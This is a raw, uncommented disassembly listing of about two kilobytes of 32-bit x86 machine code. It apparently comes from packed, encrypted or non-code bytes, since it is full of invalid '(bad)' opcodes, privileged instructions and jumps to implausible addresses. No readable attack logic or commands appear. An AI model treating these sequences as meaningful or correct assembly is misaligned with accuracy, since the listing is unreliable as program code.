  4277ae:	sub    eax,DWORD PTR [ebp-0x75]
  4277b1:	add    ebp,esp
  4277b3:	mov    al,0x55
  4277b5:	inc    ebp
  4277b6:	xor    edi,DWORD PTR [eax]
  4277b8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277bf:	inc    ebp
  4277c0:	xor    edi,DWORD PTR [ecx]
  4277c2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277c9:	test   DWORD PTR [eax],eax
  4277cb:	clc    
  4277cc:	enter  0x8645,0x33
  4277d0:	inc    DWORD PTR [ebx]
  4277d2:	(bad)  
  4277d3:	jmp    0x42781a
  4277d5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277db:	inc    ebp
  4277dc:	(bad)  
  4277dd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4277e3:	cwde   
  4277e4:	retf   
  4277e5:	xor    al,cl
  4277e7:	mov    BYTE PTR [ebp+0xb],cl
  4277ea:	lea    eax,[ebp+0x8]
  4277ed:	xor    esi,DWORD PTR [edx+0x3]
  4277f0:	add    al,ah
  4277f2:	inc    ebp
  4277f3:	dec    ebp
  4277f4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4277fa:	push   0x2b45cd00
  4277ff:	mov    al,BYTE PTR [ebx]
  427801:	or     esi,eax
  427803:	dec    ebp
  427804:	inc    ebp
  427805:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42780b:	push   ebp
  42780c:	(bad)  
  42780d:	mov    BYTE PTR [edi+0xf723b11],ch
  427813:	add    ch,ch
  427815:	inc    ebp
  427816:	dec    DWORD PTR [ebx-0x34332775]
  42781c:	add    al,0x4d
  42781e:	inc    ebp
  42781f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427825:	cwde   
  427826:	add    DWORD PTR [edx],esi
  427828:	add    BYTE PTR [ebx+0x4d00c000],cl
  42782e:	push   DWORD PTR [ebx]
  427830:	int3   
  427831:	xor    eax,DWORD PTR [eax]
  427833:	add    edx,DWORD PTR [eax+0x3]
  427836:	mov    DWORD PTR [edi],ecx
  427838:	call   0x428838fe
  42783d:	mov    DWORD PTR [ebp-0x20],esp
  427840:	add    BYTE PTR [ebp+0x7d],al
  427843:	mov    eax,DWORD PTR [eax]
  427845:	in     al,0x15
  427847:	ret    
  427848:	iret   
  427849:	(bad)  
  42784a:	enter  0x14af,0x8b
  42784e:	(bad)  
  42784f:	in     al,dx
  427850:	or     bl,cl
  427852:	adc    cl,al
  427854:	push   ebp
  427855:	dec    ebp
  427856:	inc    eax
  427857:	mov    edx,DWORD PTR [ebp-0x20]
  42785a:	jb     0x427827
  42785c:	mov    ecx,esi
  42785e:	cld    
  42785f:	scas   eax,DWORD PTR es:[edi]
  427860:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427867:	mov    BYTE PTR [eax],0x8c
  42786a:	push   0xffffff98
  42786c:	push   edi
  42786d:	xor    dl,BYTE PTR [eax+0x3b]
  427870:	mov    ecx,DWORD PTR [edi]
  427872:	call   0x8c41bdd5
  427877:	mov    eax,eax
  427879:	in     al,dx
  42787a:	jge    0x4278c9
  42787c:	mov    DWORD PTR [ebx],esi
  42787e:	int3   
  42787f:	add    eax,DWORD PTR [ebp+0xf]
  427882:	xor    eax,ecx
  427884:	(bad)  
  427885:	dec    ebp
  427886:	pushf  
  427887:	xor    ecx,eax
  427889:	add    edi,DWORD PTR [edi]
  42788b:	mov    eax,DWORD PTR [ebp-0x38]
  42788e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427895:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42789b:	xor    edx,DWORD PTR [ecx+edi*4]
  42789e:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278a5:	dec    ebp
  4278a6:	leave  
  4278a7:	mov    edx,ecx
  4278a9:	rol    BYTE PTR [ebp+0x330155],1
  4278af:	add    ecx,DWORD PTR [ebp+0xf]
  4278b2:	xor    eax,edx
  4278b4:	(bad)  
  4278b5:	ror    DWORD PTR [eax],0x86
  4278b8:	jb     0x4278b7
  4278ba:	add    bh,bh
  4278bc:	clc    
  4278bd:	inc    ebp
  4278be:	jb     0x42792a
  4278c0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278c6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278cc:	shr    BYTE PTR [eax-0x3d],0x30
  4278d0:	clc    
  4278d1:	add    BYTE PTR [ebp+0x75],al
  4278d4:	cmp    BYTE PTR [edx-0x64],ch
  4278d7:	inc    edi
  4278d9:	adc    al,0xe8
  4278db:	inc    ebp
  4278dc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4278e2:	mov    ecx,DWORD PTR [eax]
  4278e4:	cld    
  4278e5:	or     DWORD PTR [ebp-0x34],0x33
  4278e9:	jbe    0x4278ee
  4278eb:	mov    edx,DWORD PTR [ecx+0x2b]
  4278ee:	dec    ebp
  4278ef:	mov    cl,BYTE PTR [ebx+0x45d801]
  4278f5:	mov    BYTE PTR [ebx],dh
  4278f7:	mov    eax,DWORD PTR [ebx]
  4278f9:	or     BYTE PTR [ecx+0x3b],dl
  4278fc:	dec    ebp
  4278fd:	int3   
  4278fe:	xor    ebp,edi
  427900:	add    eax,DWORD PTR [ebp+0x51]
  427903:	mov    ecx,DWORD PTR [ebp-0x28]
  427906:	xor    eax,DWORD PTR [eax]
  427908:	add    ebp,DWORD PTR [eax+0x51]
  42790b:	adc    BYTE PTR [eax+0x0],0x8b
  42790f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427915:	inc    ebp
  427916:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42791c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427922:	dec    ebp
  427923:	mov    esi,DWORD PTR [ebx]
  427925:	hlt    
  427926:	add    eax,ebx
  427928:	push   ecx
  427929:	inc    ebp
  42792a:	dec    ebp
  42792b:	sar    bh,1
  42792d:	shl    ah,1
  42792f:	(bad)  
  427930:	retf   
  427931:	mov    al,ds:0xc5ff3dce
  427936:	adc    al,0xc6
  427938:	inc    ebp
  427939:	and    eax,0x9c0f4c85
  42793e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427945:	cmp    BYTE PTR [ebx+0x3b],0x0
  427949:	mov    dh,0xc7
  42794b:	cmp    eax,eax
  42794d:	jne    0x45437199
  427953:	mov    edi,DWORD PTR [edx]
  427955:	mov    eax,0x848bcb9c
  42795a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427961:	or     BYTE PTR [edi],cl
  427963:	(bad)  
  427964:	dec    ebp
  427965:	inc    edi
  427966:	add    bh,0x50
  427969:	or     cl,ch
  42796b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427971:	xchg   DWORD PTR [eax-0x1638af64],eax
  427977:	mov    esp,0xf802b588
  42797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42797d:	inc    ebp
  42797e:	(bad)  
  42797f:	cmp    al,0xff
  427981:	pushf  
  427982:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427989:	mov    ecx,DWORD PTR [ebp-0x340018]
  42798f:	into   
  427990:	dec    DWORD PTR [ebx-0x7f72431c]
  427996:	push   0x5000ff01
  42799b:	retf   
  42799c:	inc    ebp
  42799d:	into   
  42799e:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279a4:	push   eax
  4279a5:	into   
  4279a6:	call   0x4a7e36
  4279ab:	retf   
  4279ac:	add    dh,cl
  4279ae:	add    bh,bh
  4279b0:	mov    DWORD PTR [eax+ecx*1],edx
  4279b3:	clc    
  4279b4:	inc    ebp
  4279b5:	inc    ebp
  4279b6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279bc:	push   0x1
  4279be:	push   edi
  4279bf:	add    BYTE PTR [eax-0x35],dl
  4279c2:	mov    ecx,esi
  4279c4:	cld    
  4279c5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279cb:	into   
  4279cc:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279d3:	xor    eax,DWORD PTR [ebp+0x3]
  4279d6:	jne    0x427a29
  4279d8:	call   DWORD PTR [eax-0x3c]
  4279db:	mov    DWORD PTR [ecx-0x18],edx
  4279de:	mov    edi,edi
  4279e0:	call   0x8b45bf69
  4279e5:	add    ah,ah
  4279e7:	rol    BYTE PTR [ebp-0x7c],0xeb
  4279eb:	add    edi,edi
  4279ed:	add    al,ch
  4279ef:	inc    ebp
  4279f0:	push   ecx
  4279f1:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  4279f7:	mov    al,0xc7
  4279f9:	test   esp,esp
  4279fb:	clc    
  4279fc:	test   DWORD PTR [ebp-0x8],ecx
  4279ff:	add    BYTE PTR [ebp+0x50],0x39
  427a03:	jmp    0x8bcc02a4
  427a08:	in     al,dx
  427a09:	or     BYTE PTR [ebp-0xf],al
  427a0c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a12:	hlt    
  427a13:	mov    eax,DWORD PTR [ebp-0x50]
  427a16:	xor    esi,ecx
  427a18:	add    eax,DWORD PTR [eax+0x4f086889]
  427a1e:	inc    ebp
  427a1f:	sbb    eax,0x68
  427a22:	pushf  
  427a23:	inc    edi
  427a25:	add    al,ch
  427a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a28:	test   edi,edi
  427a2a:	clc    
  427a2b:	inc    DWORD PTR [ebp-0x73]
  427a2e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a32:	(bad)  
  427a33:	push   ecx
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	jne    0x4279bc
  427a37:	push   eax
  427a38:	clc    
  427a39:	test   DWORD PTR [ebp-0x1],eax
  427a3c:	cmp    eax,0xc78b9cff
  427a41:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a48:	inc    ebp
  427a49:	push   edi
  427a4a:	aas    
  427a4b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a52:	dec    ebp
  427a53:	add    BYTE PTR [ebx],dh
  427a55:	inc    ebp
  427a56:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a5c:	enter  0x8401,0x0
  427a60:	add    al,BYTE PTR [eax]
  427a62:	add    bh,bh
  427a64:	out    dx,eax
  427a65:	sbb    BYTE PTR [eax],al
  427a67:	dec    ebp
  427a68:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a6e:	sub    esi,DWORD PTR [ebx]
  427a70:	mov    ebp,DWORD PTR [eax-0x8]
  427a73:	add    bl,0x0
  427a76:	(bad)  
  427a77:	cmp    eax,ecx
  427a79:	or     BYTE PTR [edx+0x750114],al
  427a7f:	inc    DWORD PTR [ebp+0x18]
  427a82:	mov    eax,DWORD PTR [ebp-0x8]
  427a85:	mov    ebx,eax
  427a87:	(bad)  
  427a88:	retf   
  427a89:	inc    ebp
  427a8a:	into   
  427a8b:	mov    esi,eax
  427a8d:	int3   
  427a8e:	scas   eax,DWORD PTR es:[edi]
  427a8f:	push   es
  427a90:	mov    esi,DWORD PTR [ebp-0xc]
  427a93:	call   DWORD PTR [ebp+0x18]
  427a96:	sub    edi,DWORD PTR [ebp+0x3b]
  427a99:	mov    esi,DWORD PTR [edi-0x34]
  427a9c:	mov    eax,DWORD PTR [ebp-0x8]
  427a9f:	cmp    bl,al
  427aa1:	pushf  
  427aa2:	mov    bh,0xbc
  427aa5:	fadd   QWORD PTR [eax]
  427aa7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427aad:	mov    esi,DWORD PTR [ebx]
  427aaf:	in     al,0x33
  427ab1:	ret    
  427ab2:	add    eax,esi
  427ab4:	add    eax,DWORD PTR [ebp+0xf]
  427ab7:	mov    eax,ecx
  427ab9:	in     al,0x4d
  427abb:	ret    
  427abc:	mov    eax,esi
  427abe:	in     al,dx
  427abf:	inc    ebp
  427ac0:	rol    edi,1
  427ac2:	sar    al,1
  427ac4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aca:	add    BYTE PTR [edx],bh
  427acc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427ad3:	test   ebx,eax
  427ad5:	clc    
  427ad6:	retf   
  427ad7:	inc    ebp
  427ad8:	into   
  427ad9:	cmp    al,0xc6
  427adb:	pushf  
  427adc:	scas   eax,DWORD PTR es:[edi]
  427add:	(bad)  
  427ade:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427ae5:	inc    ebp
  427ae6:	cmp    edi,DWORD PTR [esi]
  427ae8:	ja     0x427a86
  427aea:	mov    eax,edi
  427aec:	mov    esp,0x458567a8
  427af1:	clc    
  427af2:	mov    eax,DWORD PTR [ebp-0x8]
  427af5:	mov    eax,ebx
  427af7:	in     al,dx
  427af8:	retf   
  427af9:	ret    
  427afa:	into   
  427afb:	mov    dh,0x7d
  427afe:	scas   eax,DWORD PTR es:[edi]
  427aff:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b05:	add    BYTE PTR [ebx],ch
  427b07:	jmp    0xb97c47
  427b0c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b0f:	mov    eax,DWORD PTR [ebp-0x14]
  427b12:	inc    ebp
  427b13:	enter  0x458b,0xf8
  427b17:	xor    eax,ebx
  427b19:	add    ecx,ebx
  427b1b:	cmp    ecx,esi
  427b1d:	shufps xmm7,xmm4,0xaf
  427b21:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b27:	dec    ebp
  427b28:	sub    esi,DWORD PTR [ebx]
  427b2a:	cmp    esi,DWORD PTR [ebx]
  427b2c:	ja     0x427b31
  427b2e:	mov    eax,DWORD PTR [ebx]
  427b30:	lods   al,BYTE PTR ds:[esi]
  427b31:	mov    db0,ecx
  427b34:	inc    ebp
  427b35:	dec    ebp
  427b36:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b3c:	retf   
  427b3d:	rol    dh,1
  427b3f:	or     al,0xce
  427b41:	inc    ebp
  427b42:	scas   eax,DWORD PTR es:[edi]
  427b43:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b49:	add    BYTE PTR [ebx],ch
  427b4b:	add    BYTE PTR [ebx],bh
  427b4d:	inc    ebp
  427b4e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b54:	inc    ebp
  427b55:	retf   
  427b56:	mov    ecx,esi
  427b58:	clc    
  427b59:	(bad)  
  427b5a:	retf   
  427b5b:	scas   eax,DWORD PTR es:[edi]
  427b5c:	ret    
  427b5d:	mov    ecx,esi
  427b5f:	hlt    
  427b60:	(bad)  
  427b61:	push   ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b69:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b6f:	add    BYTE PTR [ebx],al
  427b71:	mov    eax,eax
  427b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b74:	inc    ebp
  427b75:	dec    ebp
  427b76:	cmp    BYTE PTR [ebx],dh
  427b78:	pushf  
  427b79:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b7f:	(bad)  
  427b81:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427b89:	sar    eax,1
  427b8b:	rol    BYTE PTR [ebp+0x5],1
  427b8e:	xor    eax,DWORD PTR [ebp+0x3]
  427b91:	jmp    0x427b7e
  427b93:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427b99:	xor    eax,DWORD PTR [ebp+0x33]
  427b9c:	mov    eax,DWORD PTR [ebx]
  427b9e:	rol    BYTE PTR [ebx],1
  427ba0:	test   BYTE PTR [edi],cl
  427ba2:	cwde   
  427ba3:	shl    DWORD PTR [edx],0x4d
  427ba6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bac:	xor    edx,eax
  427bae:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bb4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bba:	add    BYTE PTR [ebx],dh
  427bbc:	inc    ebp
  427bbd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427bc3:	rdpmc  
  427bc5:	rol    DWORD PTR [ebx],0x4d
  427bc8:	loopne 0x427b55
  427bca:	push   ebp
  427bcb:	in     al,dx
  427bcc:	mov    cl,dl
  427bce:	adc    eax,edx
  427bd0:	jb     0x427bd7
  427bd2:	add    BYTE PTR [ebp+0x45],al
  427bd5:	jmp    0x427b62
  427bd7:	mov    ebx,eax
  427bd9:	test   al,0xcb
  427bdb:	dec    ebp
  427bdc:	dec    ebp
  427bdd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427be3:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427be9:	dec    ebp
  427bea:	mov    al,0x8b
  427bec:	dec    ebp
  427bed:	in     al,dx
  427bee:	xor    edx,ecx
  427bf0:	xor    edx,eax
  427bf2:	add    eax,DWORD PTR [ebp+0x3]
  427bf5:	jbe    0x427c06
  427bf7:	mov    eax,ecx
  427bf9:	test   al,0x45
  427bfb:	dec    ebp
  427bfc:	mov    DWORD PTR [ebx],esi
  427bfe:	loopne 0x427c33
  427c00:	inc    ebp
  427c01:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c07:	rol    esi,0x45
  427c0a:	scas   eax,DWORD PTR es:[edi]
  427c0b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c11:	mov    eax,ecx
  427c13:	hlt    
  427c14:	dec    ebp
  427c15:	inc    ebp
  427c16:	mov    eax,edi
  427c18:	loopne 0x427bf2
  427c1a:	retf   
  427c1b:	test   esi,ecx
  427c1d:	clc    
  427c1e:	scas   eax,DWORD PTR es:[edi]
  427c1f:	inc    ebp
  427c20:	mov    eax,edi
  427c22:	fdiv   st,st(0)
  427c24:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c2a:	cwde   
  427c2b:	cmp    dh,BYTE PTR [edx]
  427c2d:	pushf  
  427c2e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c34:	inc    esi
  427c36:	mov    ebp,DWORD PTR [eax-0x10]
  427c39:	inc    ebp
  427c3a:	dec    ebp
  427c3b:	xor    esi,DWORD PTR [ebx]
  427c3d:	add    eax,DWORD PTR [ebx]
  427c3f:	loopne 0x427c50
  427c41:	dec    ebp
  427c42:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c49:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c4f:	lock cwde 
  427c51:	ret    
  427c52:	xor    al,BYTE PTR [ebp-0x77]
  427c55:	mov    esi,esp
  427c57:	rol    BYTE PTR [ebp-0x7c],1
  427c5a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c60:	call   edi
  427c62:	enter  0x4d45,0x8b
  427c66:	mov    esi,eax
  427c68:	fmul   st(3),st
  427c6a:	push   ebp
  427c6b:	dec    ebp
  427c6c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c72:	ret    0xc198
  427c75:	xor    al,BYTE PTR [esi-0x280276]
  427c7b:	dec    ebp
  427c7c:	jne    0x427cb1
  427c7e:	mov    eax,DWORD PTR [ebx]
  427c80:	cld    
  427c81:	loopne 0x427c33
  427c83:	push   ebp
  427c84:	add    DWORD PTR [eax+0x72851100],ecx
  427c8a:	inc    DWORD PTR [eax]
  427c8c:	inc    DWORD PTR [ebp-0x75]
  427c8f:	mov    edi,esp
  427c91:	lock add bl,0x1
  427c95:	retf   
  427c96:	add    dh,al
  427c98:	xor    dh,cl
  427c9a:	inc    ebp
  427c9b:	scas   eax,DWORD PTR es:[edi]
  427c9c:	mov    eax,DWORD PTR [ebx]
  427c9e:	shl    al,0x0
  427ca1:	inc    ebp
  427ca2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427ca8:	call   0x458ee0
  427cad:	ud0    eax,ecx
  427cb0:	adc    al,0x4d
  427cb2:	inc    ebp
  427cb3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cb9:	lock push 0x338055
  427cbf:	add    eax,DWORD PTR [eax]
  427cc1:	ud0    ecx,edx
  427cc4:	sbb    BYTE PTR [ebp+0x5e],dl
  427cc7:	xor    ecx,ecx
  427cc9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cd0:	push   ecx
  427cd1:	add    BYTE PTR [ebp-0x38],cl
  427cd4:	mov    DWORD PTR [esi-0x740004],eax
  427cda:	cld    
  427cdb:	inc    ebp
  427cdc:	xchg   edx,eax
  427cdd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427ce3:	xabort 0xaf
  427ce6:	icebp  
  427ce7:	mov    esi,DWORD PTR [ebp-0x28]
  427cea:	(bad)  
  427ceb:	retf   
  427cec:	or     ecx,eax
  427cee:	(bad)  
  427cef:	dec    ebp
  427cf0:	pop    es
  427cf1:	(bad)  
  427cf2:	(bad)  
  427cf3:	or     BYTE PTR [esi],al
  427cf5:	jb     0x427cbd
  427cf7:	add    BYTE PTR [ebx],al
  427cf9:	inc    ebp
  427cfa:	(bad)  
  427cfb:	mov    ecx,DWORD PTR [edx]
  427cfd:	fadd   st(6),st
  427cff:	ret    
  427d00:	add    ch,BYTE PTR [eax-0x37]
  427d03:	int    0x55
  427d05:	sub    ebp,esp
  427d07:	add    edx,DWORD PTR [ecx-0x14]
  427d0a:	inc    ebp
  427d0b:	inc    ebp
  427d0c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d12:	cld    
  427d13:	(bad)  
  427d14:	mov    gs,WORD PTR [edi+0xf893be0]
  427d1a:	mov    ebp,ebp
  427d1c:	clc    
  427d1d:	push   eax
  427d1f:	push   DWORD PTR [ebp-0x4]
  427d22:	mov    BYTE PTR [ebp+0xa],0xff
  427d26:	(bad)  
  427d27:	int3   
  427d28:	or     BYTE PTR [eax],al
  427d2a:	(bad)  
  427d2b:	lea    eax,[edi]
  427d2d:	ins    BYTE PTR es:[edi],dx
  427d2e:	(bad)  
  427d2f:	inc    DWORD PTR [ecx]
  427d31:	push   eax
  427d32:	mov    BYTE PTR [ebp+0x9],0x8b
  427d36:	leave  
  427d37:	les    edx,FWORD PTR [ebp+0x0]
  427d3a:	in     al,dx
  427d3b:	call   DWORD PTR [ecx-0x75]
  427d3e:	inc    ebp
  427d3f:	cld    
  427d40:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d46:	cld    
  427d47:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d4d:	std    
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	clc    
  427d51:	test   eax,esi
  427d53:	je     0x427dca
  427d55:	mov    eax,esi
  427d57:	cld    
  427d58:	add    al,0x80
  427d5a:	add    WORD PTR [ecx+0x0],ax
  427d5e:	fadd   QWORD PTR [eax]
  427d60:	mov    BYTE PTR [eax],0xd0
  427d63:	push   0xffffffc3
  427d65:	push   edi
  427d66:	mov    edx,DWORD PTR [eax+0x51]
  427d69:	pop    edi
  427d6a:	lea    ebx,[ebx-0x8]
  427d6d:	ret    0x45
  427d70:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d76:	xchg   eax,edi
  427d78:	mov    DWORD PTR [ebp-0x75],ecx
  427d7b:	push   esi
  427d7c:	clc    
  427d7d:	jne    0x427d4f
  427d7f:	mov    ecx,0xf8450b0b
  427d84:	(bad)  
  427d85:	push   cs
  427d86:	or     BYTE PTR [ebp-0x3a],dh
  427d89:	cmp    eax,DWORD PTR [ecx]
  427d8b:	pop    esi
  427d8c:	(bad)  
  427d8d:	or     al,0x5
  427d8f:	inc    eax
  427d90:	leave  
  427d91:	in     al,dx
  427d92:	add    al,0x42
  427d94:	push   esi
  427d95:	and    eax,0xedc940cf
  427d9a:	inc    DWORD PTR [eax-0x75]
  427d9d:	fmul   QWORD PTR [ebx-0xf8739be]
  427da3:	inc    eax
  427da4:	nop
  427da5:	jmp    0x518b:0x8b8bc3ff
  427dac:	(bad)  
  427dad:	lea    eax,ds:0xff45e8f8
  427db3:	push   esi
  427db4:	push   DWORD PTR [ebp-0x39]
  427db7:	mov    eax,0x7edda46
  427dbc:	or     al,0x6
  427dbe:	push   DWORD PTR [ebp-0x3a]
  427dc1:	cmp    eax,DWORD PTR [edx]
  427dc3:	pop    esi
  427dc4:	ret    
  427dc5:	or     al,0x56
  427dc7:	inc    ecx
  427dc8:	push   ebp
  427dc9:	js     0x427db7
  427dcb:	inc    edx
  427dcc:	inc    ebp
  427dcd:	int    0x1
  427dcf:	inc    ecx
  427dd0:	sub    BYTE PTR ds:0xe77541fc,ah
  427dd6:	add    DWORD PTR [edx+0x1c],eax
  427dd9:	int3   
  427dda:	mov    eax,ebx
  427ddc:	adc    al,0x8b
  427dde:	xchg   edx,eax
  427ddf:	push   ecx
  427de0:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427de6:	rcl    DWORD PTR [esi-0x9],cl
  427de9:	jne    0x427e3b
  427deb:	mov    eax,0x7c80ece
  427df0:	rol    DWORD PTR [esi],cl
  427df2:	div    DWORD PTR [ebp+0x50]
  427df5:	cmp    ecx,edx
  427df7:	pop    esi
  427df8:	dec    BYTE PTR [edx]
  427dfa:	in     al,dx
  427dfb:	inc    edx
  427dfc:	sub    ebp,ecx
  427dfe:	inc    eax
  427dff:	(bad)  
  427e00:	push   eax
  427e01:	add    edx,DWORD PTR [eax-0x17]
  427e04:	push   edi
  427e05:	add    dh,dh
  427e07:	leave  
  427e08:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e0c:	add    BYTE PTR [ecx+0x0],dl
  427e0f:	inc    ebp
  427e10:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e16:	add    BYTE PTR [eax-0x7fbf448],bh
  427e1c:	add    al,0x2
  427e1e:	jmp    0x57e2978
  427e23:	jne    0x427e0d
  427e25:	mov    eax,DWORD PTR [edx]
  427e27:	or     BYTE PTR [eax],al
  427e29:	inc    ecx
  427e2a:	stc    
  427e2b:	in     eax,dx
  427e2c:	ss inc eax
  427e2e:	aas    
  427e2f:	out    0x7d,eax
  427e31:	inc    ecx
  427e32:	mov    esi,ecx
  427e34:	lock ret 0x7d
  427e38:	and    ecx,DWORD PTR [ebx-0x171777]
  427e3e:	add    bh,bh
  427e40:	aad    0xd7
  427e42:	add    dh,cl
  427e44:	clts   
  427e46:	(bad)  
  427e47:	call   0xffcd7d4c
  427e4c:	hlt    
  427e4d:	iret   
  427e4e:	jge    0x427e26
  427e50:	rol    DWORD PTR [esi-0x80],cl
  427e53:	icebp  
  427e54:	or     BYTE PTR [edi-0x27],cl
  427e57:	(bad)  
  427e58:	out    dx,al
  427e59:	mov    eax,DWORD PTR [ebx]
  427e5b:	(bad)  
  427e5c:	pop    esi
  427e5d:	push   es
  427e5e:	cmp    al,0xe8
  427e60:	sar    edi,0x8
  427e63:	inc    DWORD PTR [edi]
  427e65:	inc    esi
  427e66:	(bad)  
  427e67:	jmp    0x8b00:0x530e577e
  427e6e:	push   esi
  427e6f:	mov    eax,DWORD PTR [eax]
  427e71:	and    al,0x0
  427e73:	inc    ebp
  427e74:	push   eax
  427e75:	push   eax
  427e76:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e7c:	sub    edx,DWORD PTR [esi-0x24]
  427e7f:	jne    0x427e37
  427e81:	lods   eax,DWORD PTR ds:[esi]
  427e82:	mov    edx,DWORD PTR [edx-0x34]
  427e85:	dec    esi
  427e86:	out    0x83,eax
  427e88:	into   
  427e89:	push   edi
  427e8b:	loopne 0x427e5b
  427e8d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427e91:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427e98:	rol    DWORD PTR [edx],0x8
  427e9b:	mov    esp,ecx
  427e9d:	cmp    DWORD PTR [ebx],0xc
  427ea0:	mov    esi,0x5001c0
  427ea5:	push   eax
  427ea6:	push   cs
  427ea7:	push   eax
  427ea8:	(bad)  
  427ea9:	sub    edx,edi
  427eab:	push   esi
  427eac:	adc    al,0xcb
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    eax,0x203e8
  427eb4:	add    al,ah
  427eb6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427ebd:	add    dh,al
  427ebf:	add    ah,ch
  427ec1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ec7:	pop    ecx
  427ec8:	or     eax,ebx
  427eca:	cli    
  427ecb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ed1:	lea    ebp,[ebx]
  427ed3:	mov    edx,DWORD PTR [edx-0x4]
  427ed6:	dec    ecx
  427ed7:	inc    ebp
  427ed8:	shr    BYTE PTR [ebx],0x4b
  427edb:	and    al,0x0
  427edd:	(bad)  
  427ede:	jne    0x427f25
  427ee0:	pop    eax
  427ee1:	mov    al,0x5a
  427ee3:	call   0x1418142
  427ee8:	and    al,0x85
  427eea:	push   edx
  427eeb:	add    BYTE PTR [eax+eax*1+0x0],ah
  427eef:	dec    ebp
  427ef0:	mov    cl,0x23
  427ef2:	jmp    0x427ee0
  427ef4:	mov    al,0xe7
  427ef6:	call   0x13881e4
  427efb:	shr    DWORD PTR [eax+ebx*2],cl
  427efe:	lock (bad) 
  427f00:	adc    eax,0x757f008d
  427f05:	out    0x58,eax
  427f07:	cmp    al,0x7
  427f09:	pop    edx
  427f0a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f11:	push   ecx
  427f12:	cld    
  427f13:	mov    esi,0x3b0175
  427f18:	and    al,0xb0
  427f1a:	xor    BYTE PTR [edx+0x1],0x8b
  427f1e:	add    ah,bh
  427f20:	mov    edi,DWORD PTR [ebp-0x4]
  427f23:	psubsw mm7,QWORD PTR [edi]
